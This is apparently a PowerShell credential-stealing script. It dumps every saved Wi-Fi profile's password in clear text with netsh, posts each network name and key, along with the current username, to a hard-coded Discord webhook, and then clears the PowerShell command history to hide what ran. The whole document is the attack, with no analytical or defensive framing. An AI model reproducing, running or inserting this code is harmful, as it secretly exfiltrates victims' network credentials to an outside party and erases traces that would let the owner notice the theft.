
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
	$discord='https://discord.com/api/webhooks/1297456168473595955/W0Ce4qM77MCgoJaHX1jQetraeb0xh8uxpcN6CvfuGrJqU-9n5llZERNtj6lTrsFhKNtE'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
	
}

# Clear the PowerShell command history
Clear-History
